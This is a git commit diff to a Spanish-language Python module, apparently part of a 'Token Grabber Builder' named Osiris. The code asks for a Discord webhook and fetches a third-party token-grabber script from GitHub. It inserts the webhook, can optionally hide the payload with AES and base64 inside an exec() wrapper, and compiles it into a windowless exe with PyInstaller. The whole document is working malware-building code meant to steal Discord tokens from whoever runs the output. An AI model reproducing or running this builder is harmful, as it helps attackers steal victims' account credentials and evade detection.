bc35e4eccc81c64571901fc3df1197296c88cef9
Dan <72712659+zEncrypte@users.noreply.github.com>
2022-06-16 16:09:16 -0500

    Update tokenGrabber.py

--- modules/tokenGrabber.py
+++ modules/tokenGrabber.py
@@ -2,21 +2,27 @@ import os, sys, shutil, requests, base64, random
 from time import sleep
 from Crypto.Cipher import AES
 from Crypto import Random
-from pystyle import Colors
+from pystyle import Colors, System, Cursor
 def tortuga(_str):
     for letra in _str:
         sys.stdout.write(letra);sys.stdout.flush();sleep(0.03)
 def create_grabber():
+
+    System.Clear()
+    System.Title("Esperando Webhook...")
+    Cursor.HideCursor()
     webhookUrl = input(f"\n {Colors.purple}[{Colors.light_blue}>{Colors.purple}] Webhook: {Colors.white}")
     if "https://discord.com/api/webhooks" in webhookUrl:
+        System.Title("Introduce un nombre...")
         fileName = input(f" {Colors.purple}[{Colors.light_blue}>{Colors.purple}] Nombre del archivo: {Colors.white}")
-        print(f"\n {Colors.purple}[{Colors.light_blue}+{Colors.purple}]{Colors.light_green} Escribiendo codigo...")
+        System.Title("Construyendo...")
+        print(f"\n {Colors.purple}[{Colors.light_blue}*{Colors.purple}]{Colors.light_green} Un momento por favor...")
         sleep(.3)
     code = requests.get("https://raw.githubusercontent.com/Rdimo/Hazard-Token-Grabber-V2/master/main.py").text.replace("WEBHOOK_HERE", webhookUrl) #Rdimo token grabber
     with open(f"{fileName}.py", 'w', errors="ignore") as f:
         f.write(code)
-
-    tortuga(f"\n {Colors.purple}[{Colors.red}!{Colors.purple}]{Colors.white} ¿Deseas ofuscar {fileName}.exe?")
+    System.Title("Esperando respuesta...")
+    tortuga(f"\n {Colors.purple}[{Colors.red}!{Colors.purple}]{Colors.white} ¿Deseas protejer {fileName}.exe?")
     yesno = input(f'\n {Colors.purple}[{Colors.light_blue}>{Colors.purple}] {Colors.purple}y{Colors.light_blue}/{Colors.purple}n: {Colors.white}')
     if yesno.lower() == "y" or yesno.lower() == "yes":
         IV = Random.new().read(AES.block_size)
@@ -36,8 +42,8 @@ def create_grabber():
             encodedBytes = base64.b64encode(_file.encode())
             obfuscatedBytes = AES.new(key.encode(), AES.MODE_CFB, IV).encrypt(encodedBytes)
             f.write(f'{imports}exec(__import__(\'\\x62\\x61\\x73\\x65\\x36\\x34\').b64decode(AES.new({key.encode()}, AES.MODE_CFB, {IV}).decrypt({obfuscatedBytes})).decode())'.encode())
-
-    print(f"\n {Colors.purple}[{Colors.light_blue}+{Colors.purple}]{Colors.light_green} Un momento estamos contruyendo {fileName}.exe, esto tomara unos minutos. {Colors.gray}\n")
+    System.Title("Convirtiendo a EXE...")
+    print(f"\n {Colors.purple}[{Colors.light_blue}*{Colors.purple}]{Colors.light_green} Esto tomara unos minutos {Colors.gray}\n")
     os.system(f"pyinstaller --onefile --noconsole --clean --log-level=INFO -i NONE -n {fileName} {fileName}.py")
     try:
         shutil.move(f"{os.getcwd()}\\dist\\{fileName}.exe", f"{os.getcwd()}\\{fileName}.exe")
@@ -48,5 +54,5 @@ def create_grabber():
         os.remove(f'{fileName}.py')
     except FileNotFoundError:
         pass
-
-    tortuga(f"\n {Colors.purple}[{Colors.light_blue}+{Colors.purple}] EL archivo {Colors.light_red}{fileName}.exe{Colors.purple} ha sido creado correctamente\n")
+    System.Title("Token Grabber Builder :: Osiris")
+    tortuga(f"\n {Colors.purple}[{Colors.light_blue}*{Colors.purple}] EL archivo {Colors.light_red}{fileName}.exe{Colors.purple} ha sido creado correctamente\n")
